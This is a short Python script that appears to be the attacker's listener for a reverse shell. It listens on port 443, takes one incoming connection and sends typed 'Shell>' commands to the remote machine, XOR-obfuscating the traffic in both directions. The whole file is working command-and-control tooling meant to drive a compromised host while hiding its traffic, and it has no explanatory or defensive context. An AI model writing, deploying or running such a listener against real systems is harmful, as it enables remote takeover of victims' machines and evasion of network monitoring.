import socket

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 443
XOR_KEY = 0xAA

def xor_data(data):
    return bytes([b ^ XOR_KEY for b in data])

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((LISTEN_IP, LISTEN_PORT))
server.listen(1)
print(f"[*] Listening on {LISTEN_PORT}...")

conn, addr = server.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = input("Shell> ")
    if not cmd: continue
    conn.send(xor_data(cmd.encode()))
    data = conn.recv(4096)
    print(xor_data(data).decode(errors='ignore'))
